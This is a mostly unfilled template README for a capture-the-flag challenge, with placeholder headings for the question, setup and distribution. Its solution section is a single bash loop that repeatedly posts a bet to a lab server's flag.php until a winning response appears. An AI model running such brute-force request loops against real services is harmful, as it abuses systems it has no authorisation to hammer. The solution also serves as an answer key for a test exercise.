# Challenge Name
Brief information on how to set up this challenge

## Question Text
Challenge Description

## Setup Guide
1. Fill this in
2. Commit to git
3. Push to repository

## Distribution
Distribute all the contents inside `distrib` folder to the users.

## Solution
```bash
while [ 1 ]; do curl -s 'http://172.17.0.4/flag.php' --data 'bet=1' | grep -v Sorry; done
```

